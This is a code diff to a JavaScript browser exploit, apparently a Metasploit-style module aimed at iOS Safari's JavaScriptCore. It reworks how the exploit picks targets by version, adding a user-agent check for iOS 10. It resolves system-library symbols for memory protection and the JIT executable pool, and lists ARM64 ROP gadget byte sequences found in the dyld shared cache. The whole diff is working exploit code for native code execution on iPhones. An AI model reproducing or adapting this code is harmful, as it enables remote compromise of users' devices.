@@ -607,59 +607,64 @@ function exploit(){
         }
            var libs =
         {
-            "/usr/lib/system/libdyld.dylib":                                        ["_dlsym", "_dlopen"],
-            #{ ios_11 ? '
-            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   ["__ZN3JSC29jitWriteSeparateHeapsFunctionE"],
-            "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp"],
-            ' : '
             "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
             "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
-            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   ["__ZN3JSC30endOfFixedExecutableMemoryPoolE"],
-            '}
-        }
-
-        #{ ios_11 ? '
-        var opcodes = {
-            // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
-            "ldrx8":     [ [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0] ],
-            // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
-            "dispatch":  [ [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ] ],
-            // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
-            "regloader": [ [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ] ],
-            // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
-            // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
-            "stackloader": [ [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ] ],
-            // mov x4, x20 ; blr x8
-            "movx4":     [ [ 0xaa1403e4, 0xd63f0100 ] ],
-        }
-        var opcode_libs = [
-            "/usr/lib/PN548.dylib",     // dispatch, stackloader
-            "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
-        ];
-
-        ' : '
-        var opcodes = {
-            // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
-            "regloader": [ [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ] ],
-            "dispatch": [
-                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
-                [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
-                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret
-                [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],
-            ],
-            "stackloader": [
-                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
-                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
-                [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
-                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];
-                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
-                [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],
+            "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
+            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
+                "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
             ],
         };
 
-        var opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
-        '}
+        var opcodes;
+        var opcode_libs;
 
+        if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
+            //print('found iPhone OS 10')
+            opcodes = {
+                // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
+                "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
+                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret
+                "altdispatch": [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],
+                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];
+                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
+                "altstackloader": [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],
+            };
+
+            opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
+        } else {
+            //print('found iPhone OS != 10')
+            libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
+                "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
+            )
+
+            opcodes = {
+                // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
+                "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
+                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+                // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
+                "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
+                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+                // mov x4, x20 ; blr x8
+                "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
+                // ldr x0, [x0] -- for debugging
+                "ldrx0x0":     [ 0xf9400000 ],
+            }
+            opcode_libs = [
+                "/usr/lib/PN548.dylib",     // dispatch, stackloader
+                "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
+            ];
+        }
+        var syms = {};
+        var gadgets = {};
         var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
         var nimgs = memory.u32(Add(hdr, 0x1c));
         for(var i = 0; i < nimgs; ++i)
